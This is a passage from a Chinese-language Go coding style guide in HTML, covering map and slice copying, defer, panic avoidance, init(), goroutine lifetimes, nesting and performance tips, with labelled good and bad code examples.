class="hljs-comment">// 这里我们修改 trips[0]，但不会影响到 d1.trips</span><br>trips[<span class="hljs-number">0</span>] = ...<br></code></pre></td></tr></table></figure><h4 id="2-8-2-返回-slices-或-maps"><a href="#2-8-2-返回-slices-或-maps" class="headerlink" title="2.8.2 返回 slices 或 maps"></a>2.8.2 返回 slices 或 maps</h4><p>同样，请注意用户对暴露内部状态的 map 或 slice 的修改。</p><p>正例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Stats <span class="hljs-keyword">struct</span> &#123;<br>  mu sync.Mutex<br><br>  counters <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Stats)</span></span> Snapshot() <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span> &#123;<br>  s.mu.Lock()<br>  <span class="hljs-keyword">defer</span> s.mu.Unlock()<br><br>  result := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(s.counters))<br>  <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> s.counters &#123;<br>    result[k] = v<br>  &#125;<br>  <span class="hljs-keyword">return</span> result<br>&#125;<br><br><span class="hljs-comment">// snapshot 现在是一个拷贝</span><br>snapshot := stats.Snapshot()<br></code></pre></td></tr></table></figure><p>反例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Stats <span class="hljs-keyword">struct</span> &#123;<br>  mu sync.Mutex<br><br>  counters <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-comment">// Snapshot 返回当前状态。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Stats)</span></span> Snapshot() <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span> &#123;<br>  s.mu.Lock()<br>  <span class="hljs-keyword">defer</span> s.mu.Unlock()<br><br>  <span class="hljs-keyword">return</span> s.counters<br>&#125;<br><br><span class="hljs-comment">// snapshot 不再受互斥锁保护</span><br><span class="hljs-comment">// 因此对 snapshot 的任何访问都将受到数据竞争的影响</span><br><span class="hljs-comment">// 影响 stats.counters</span><br>snapshot := stats.Snapshot()<br></code></pre></td></tr></table></figure><h3 id="2-9-使用-defer-释放资源"><a href="#2-9-使用-defer-释放资源" class="headerlink" title="2.9 使用 defer 释放资源"></a>2.9 使用 defer 释放资源</h3><p>使用 defer 释放资源，诸如文件和锁。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br>p.Lock()<br><span class="hljs-keyword">defer</span> p.Unlock()<br><br><span class="hljs-keyword">if</span> p.count &lt; <span class="hljs-number">10</span> &#123;<br>  <span class="hljs-keyword">return</span> p.count<br>&#125;<br><br>p.count++<br><span class="hljs-keyword">return</span> p.count<br><br><span class="hljs-comment">// 更可读</span><br>反例：<br>p.Lock()<br><span class="hljs-keyword">if</span> p.count &lt; <span class="hljs-number">10</span> &#123;<br>  p.Unlock()<br>  <span class="hljs-keyword">return</span> p.count<br>&#125;<br><br>p.count++<br>newCount := p.count<br>p.Unlock()<br><br><span class="hljs-keyword">return</span> newCount<br><br><span class="hljs-comment">// 当有多个 return 分支时，很容易遗忘 unlock</span><br></code></pre></td></tr></table></figure><p>Defer 的开销非常小，只有在您可以证明函数执行时间处于纳秒级的程度时，才应避免这样做。使用 defer 提升可读性是值得的，因为使用它们的成本微不足道。尤其适用于那些不仅仅是简单内存访问的较大的方法，在这些方法中其他计算的资源消耗远超过 <code>defer</code>。</p><h3 id="2-10-不要使用-panic"><a href="#2-10-不要使用-panic" class="headerlink" title="2.10 不要使用 panic"></a>2.10 不要使用 panic</h3><p>在生产环境中运行的代码必须避免出现 panic。panic 是 <a href="https://en.wikipedia.org/wiki/Cascading_failure">级联失败</a> 的主要根源 。如果发生错误，该函数必须返回错误，并允许调用方决定如何处理它。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">run</span><span class="hljs-params">(args []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) == <span class="hljs-number">0</span> &#123;<br>    <span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;an argument is required&quot;</span>)<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">if</span> err := run(os.Args[<span class="hljs-number">1</span>:]); err != <span class="hljs-literal">nil</span> &#123;<br>    fmt.Fprintln(os.Stderr, err)<br>    os.Exit(<span class="hljs-number">1</span>)<br>  &#125;<br>&#125;<br><br>反例：<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">run</span><span class="hljs-params">(args []<span class="hljs-type">string</span>)</span></span> &#123;<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) == <span class="hljs-number">0</span> &#123;<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;an argument is required&quot;</span>)<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  run(os.Args[<span class="hljs-number">1</span>:])<br>&#125;<br></code></pre></td></tr></table></figure><p>panic&#x2F;recover 不是错误处理策略。仅当发生不可恢复的事情（例如：nil 引用）时，程序才必须 panic。程序初始化是一个例外：程序启动时应使程序中止的不良情况可能会引起 panic。</p><h3 id="2-11-避免可变全局变量"><a href="#2-11-避免可变全局变量" class="headerlink" title="2.11 避免可变全局变量"></a>2.11 避免可变全局变量</h3><p>使用选择依赖注入方式避免改变全局变量。 既适用于函数指针又适用于其他值类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-comment">// sign.go</span><br><span class="hljs-keyword">type</span> signer <span class="hljs-keyword">struct</span> &#123;<br>  now <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> time.Time<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newSigner</span><span class="hljs-params">()</span></span> *signer &#123;<br>  <span class="hljs-keyword">return</span> &amp;signer&#123;<br>    now: time.Now,<br>  &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *signer)</span></span> Sign(msg <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>  now := s.now()<br>  <span class="hljs-keyword">return</span> signWithTime(msg, now)<br>&#125;<br><br>反例：<br><span class="hljs-comment">// sign.go</span><br><span class="hljs-keyword">var</span> _timeNow = time.Now<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sign</span><span class="hljs-params">(msg <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>  now := _timeNow()<br>  <span class="hljs-keyword">return</span> signWithTime(msg, now)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-12-避免使用-init"><a href="#2-12-避免使用-init" class="headerlink" title="2.12 避免使用 init()"></a>2.12 避免使用 <code>init()</code></h3><p>尽可能避免使用<code>init()</code>。当<code>init()</code>是不可避免或可取的，代码应先尝试：</p><ol><li>无论程序环境或调用如何，都要完全确定。</li><li>避免依赖于其他<code>init()</code>函数的顺序或副作用。虽然<code>init()</code>顺序是明确的，但代码可以更改， 因此<code>init()</code>函数之间的关系可能会使代码变得脆弱和容易出错。</li><li>避免访问或操作全局或环境状态，如机器信息、环境变量、工作目录、程序参数&#x2F;输入等。</li><li>避免<code>I/O</code>，包括文件系统、网络和系统调用。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-keyword">var</span> _defaultFoo = Foo&#123;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-comment">// or，为了更好的可测试性：</span><br><span class="hljs-keyword">var</span> _defaultFoo = defaultFoo()<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">defaultFoo</span><span class="hljs-params">()</span></span> Foo &#123;<br>    <span class="hljs-keyword">return</span> Foo&#123;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br><br>反例：<br><br><span class="hljs-keyword">type</span> Foo <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-keyword">var</span> _defaultFoo Foo<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>    _defaultFoo = Foo&#123;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>不能满足这些要求的代码可能属于要作为<code>main()</code>调用的一部分（或程序生命周期中的其他地方）， 或者作为<code>main()</code>本身的一部分写入。特别是，打算由其他程序使用的库应该特别注意完全确定性， 而不是执行“init magic”</p><h3 id="2-13-追加时优先指定切片容量"><a href="#2-13-追加时优先指定切片容量" class="headerlink" title="2.13 追加时优先指定切片容量"></a>2.13 追加时优先指定切片容量</h3><p>在尽可能的情况下，在初始化要追加的切片时为<code>make()</code>提供一个容量值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-keyword">for</span> n := <span class="hljs-number">0</span>; n &lt; b.N; n++ &#123;<br>  data := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, size)<br>  <span class="hljs-keyword">for</span> k := <span class="hljs-number">0</span>; k &lt; size; k++&#123;<br>    data = <span class="hljs-built_in">append</span>(data, k)<br>  &#125;<br>&#125;<br><br>反例：<br><span class="hljs-keyword">for</span> n := <span class="hljs-number">0</span>; n &lt; b.N; n++ &#123;<br>  data := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>)<br>  <span class="hljs-keyword">for</span> k := <span class="hljs-number">0</span>; k &lt; size; k++&#123;<br>    data = <span class="hljs-built_in">append</span>(data, k)<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-14-不要一劳永逸地使用-goroutine"><a href="#2-14-不要一劳永逸地使用-goroutine" class="headerlink" title="2.14 不要一劳永逸地使用 goroutine"></a>2.14 不要一劳永逸地使用 goroutine</h3><p>Goroutines 是轻量级的，但它们不是免费的： 至少，它们会为堆栈和 CPU 的调度消耗内存。 虽然这些成本对于 Goroutines 的使用来说很小，但当它们在没有受控生命周期的情况下大量生成时会导致严重的性能问题。 具有非托管生命周期的 Goroutines 也可能导致其他问题，例如防止未使用的对象被垃圾回收并保留不再使用的资源。</p><p>因此，不要在代码中泄漏 goroutine。 使用 <a href="https://pkg.go.dev/go.uber.org/goleak">go.uber.org&#x2F;goleak</a> 来测试可能产生 goroutine 的包内的 goroutine 泄漏。</p><p>一般来说，每个 goroutine:</p><ul><li>必须有一个可预测的停止运行时间； 或者</li><li>必须有一种方法可以向 goroutine 发出信号它应该停止</li></ul><p>在这两种情况下，都必须有一种方式代码来阻塞并等待 goroutine 完成。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-keyword">var</span> (<br>  stop = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;) <span class="hljs-comment">// 告诉 goroutine 停止</span><br>  done = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;) <span class="hljs-comment">// 告诉我们 goroutine 退出了</span><br>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(done)<br>  ticker := time.NewTicker(delay)<br>  <span class="hljs-keyword">defer</span> ticker.Stop()<br>  <span class="hljs-keyword">for</span> &#123;<br>    <span class="hljs-keyword">select</span> &#123;<br>    <span class="hljs-keyword">case</span> &lt;-tick.C:<br>      flush()<br>    <span class="hljs-keyword">case</span> &lt;-stop:<br>      <span class="hljs-keyword">return</span><br>    &#125;<br>  &#125;<br>&#125;()<br><span class="hljs-comment">// 其它...</span><br><span class="hljs-built_in">close</span>(stop)  <span class="hljs-comment">// 指示 goroutine 停止</span><br>&lt;-done       <span class="hljs-comment">// and wait for it to exit</span><br><br>反例：<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">for</span> &#123;<br>    flush()<br>    time.Sleep(delay)<br>  &#125;<br>&#125;()<br><br><br></code></pre></td></tr></table></figure><h3 id="2-15-减少嵌套"><a href="#2-15-减少嵌套" class="headerlink" title="2.15 减少嵌套"></a>2.15 减少嵌套</h3><p>代码应通过尽可能先处理错误情况&#x2F;特殊情况并尽早返回或继续循环来减少嵌套。减少嵌套多个级别的代码的代码量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> data &#123;<br>  <span class="hljs-keyword">if</span> v.F1 != <span class="hljs-number">1</span> &#123;<br>    log.Printf(<span class="hljs-string">&quot;Invalid v: %v&quot;</span>, v)<br>    <span class="hljs-keyword">continue</span><br>  &#125;<br><br>  v = process(v)<br>  <span class="hljs-keyword">if</span> err := v.Call(); err != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-keyword">return</span> err<br>  &#125;<br>  v.Send()<br>&#125;<br>反例：<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> data &#123;<br>  <span class="hljs-keyword">if</span> v.F1 == <span class="hljs-number">1</span> &#123;<br>    v = process(v)<br>    <span class="hljs-keyword">if</span> err := v.Call(); err == <span class="hljs-literal">nil</span> &#123;<br>      v.Send()<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> err<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    log.Printf(<span class="hljs-string">&quot;Invalid v: %v&quot;</span>, v)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-16-不必要的-else"><a href="#2-16-不必要的-else" class="headerlink" title="2.16  不必要的 else"></a>2.16  不必要的 else</h3><p>如果在 if 的两个分支中都设置了变量，则可以将其替换为单个 if。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br>a := <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> b &#123;<br>  a = <span class="hljs-number">100</span><br>&#125;<br>反例：<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span><br><span class="hljs-keyword">if</span> b &#123;<br>  a = <span class="hljs-number">100</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  a = <span class="hljs-number">10</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-17-初始化-Maps"><a href="#2-17-初始化-Maps" class="headerlink" title="2.17 初始化 Maps"></a>2.17 初始化 Maps</h3><p>对于空 map 请使用 <code>make(..)</code> 初始化， 并且 map 是通过编程方式填充的。 这使得 map 初始化在表现上不同于声明，并且它还可以方便地在 make 后添加大小提示。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-keyword">var</span> (<br>  <span class="hljs-comment">// m1 读写安全;</span><br>  <span class="hljs-comment">// m2 在写入时会 panic</span><br>  m1 = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[T1]T2)<br>  m2 <span class="hljs-keyword">map</span>[T1]T2<br>)<br>反例：<br><span class="hljs-keyword">var</span> (<br>  <span class="hljs-comment">// m1 读写安全;</span><br>  <span class="hljs-comment">// m2 在写入时会 panic</span><br>  m1 = <span class="hljs-keyword">map</span>[T1]T2&#123;&#125;<br>  m2 <span class="hljs-keyword">map</span>[T1]T2<br>)<br><br>声明和初始化看起来差别非常大。<br></code></pre></td></tr></table></figure><h2 id="3-性能"><a href="#3-性能" class="headerlink" title="3 性能"></a>3 性能</h2><p>性能方面的特定准则只适用于高频场景。</p><h3 id="3-1-优先使用-strconv-而不是-fmt"><a href="#3-1-优先使用-strconv-而不是-fmt" class="headerlink" title="3.1 优先使用 strconv 而不是 fmt"></a>3.1 优先使用 strconv 而不是 fmt</h3><p>将原语转换为字符串或从字符串转换时，<code>strconv</code>速度比<code>fmt</code>快。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>  s := strconv.Itoa(rand.Int())<br>&#125;<br>BenchmarkStrconv<span class="hljs-number">-4</span>    <span class="hljs-number">64.2</span> ns/op    <span class="hljs-number">1</span> allocs/op<br>反例：<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>  s := fmt.Sprint(rand.Int())<br>&#125;<br>BenchmarkFmtSprint<span class="hljs-number">-4</span>    <span class="hljs-number">143</span> ns/op    <span class="hljs-number">2</span> allocs/op<br></code></pre></td></tr></table></figure><h3 id="3-2-避免字符串到字节的转换"><a href="#3-2-避免字符串到字节的转换" class="headerlink" title="3.2 避免字符串到字节的转换"></a>3.2 避免字符串到字节的转换</h3><p>不要反复从固定字符串创建字节 slice。相反，请执行一次转换并捕获结果。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br>data := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;Hello world&quot;</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>  w.Write(data)<br>&#125;<br>BenchmarkGood<span class="hljs-number">-4</span>  <span class="hljs-number">500000000</span>   <span class="hljs-number">3.25</span> ns/op<br>反例：<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>  w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;Hello world&quot;</span>))<br>&#125;<br>BenchmarkBad<span class="hljs-number">-4</span>   <span class="hljs-number">50000000</span>   <span class="hljs-number">22.2</span> ns/op<br></code></pre></td></tr></table></figure><h3 id="3-3-指定容器容量"><a href="#3-3-指定容器容量" class="headerlink" title="3.3 指定容器容量"></a>3.3 指定容器容量</h3><p>尽可能指定容器容量，以便为容器预先分配内存。这将在添加元素时最小化后续分配（通过复制和调整容器大小）。</p><p>在尽可能的情况下，在使用 <code>make()</code> 初始化的时候提供容量信息</p><p>向<code>make()</code>提供容量提示会在初始化时尝试调整 map 的大小，这将减少在将元素添加到 map 时为 map 重新分配内存。</p><p>注意，与 slices 不同。map capacity 提示并不保证完全的抢占式分配，而是用于估计所需的 hashmap bucket 的数量。 因此，在将元素添加到 map 时，甚至在指定 map 容量时，仍可能发生分配。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br>files, _ := os.ReadDir(<span class="hljs-string">&quot;./files&quot;</span>)<br><br>m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]os.FileInfo, <span class="hljs-built_in">len</span>(files))<br><span class="hljs-keyword">for</span> _, f := <span class="hljs-keyword">range</span> files &#123;<br>    m[f.Name()] = f<br>&#125;<br>m 是有大小提示创建的；在运行时可能会有更少的分配。<br>反例：<br>m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]os.FileInfo)<br><br>files, _ := os.ReadDir(<span class="hljs-string">&quot;./files&quot;</span>)<br><span class="hljs-keyword">for</span> _, f := <span class="hljs-keyword">range</span> files &#123;<br>    m[f.Name()] = f<br>&#125;<br>m 是在没有大小提示的情况下创建的； 在运行时可能会有更多分配。<br><br></code></pre></td></tr></table></figure><h3 id="3-4-字符串拼接用strings-Builder"><a href="#3-4-字符串拼接用strings-Builder" class="headerlink" title="3.4 字符串拼接用strings.Builder"></a>3.4 字符串拼接用strings.Builder</h3><p>综合易用性和性能，一般推荐使用 <code>strings.Builder</code> 来拼接字符串。</p><p>参考链接：<a href="https://geektutu.com/post/hpg-string-concat.html">https://geektutu.com/post/hpg-string-concat.html</a></p><h3 id="3-5-结构体集合用for还是range遍历"><a href="#3-5-结构体集合用for还是range遍历" class="headerlink" title="3.5 结构体集合用for还是range遍历"></a>3.5 结构体集合用for还是range遍历</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Item <span class="hljs-keyword">struct</span> &#123;<br>id  <span class="hljs-type">int</span><br>val [<span class="hljs-number">4096</span>]<span class="hljs-type">byte</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkForStruct</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br><span class="hljs-keyword">var</span> items [<span class="hljs-number">1024</span>]Item<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>length := <span class="hljs-built_in">len</span>(items)<br><span class="hljs-keyword">var</span> tmp <span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> k := <span class="hljs-number">0</span>; k &lt; length; k++ &#123;<br>tmp = items[k].id<br>&#125;<br>_ = tmp<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkRangeIndexStruct</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br><span class="hljs-keyword">var</span> items [<span class="hljs-number">1024</span>]Item<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br><span class="hljs-keyword">var</span> tmp <span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> k := <span class="hljs-keyword">range</span> items &#123;<br>tmp = items[k].id<br>&#125;<br>_ = 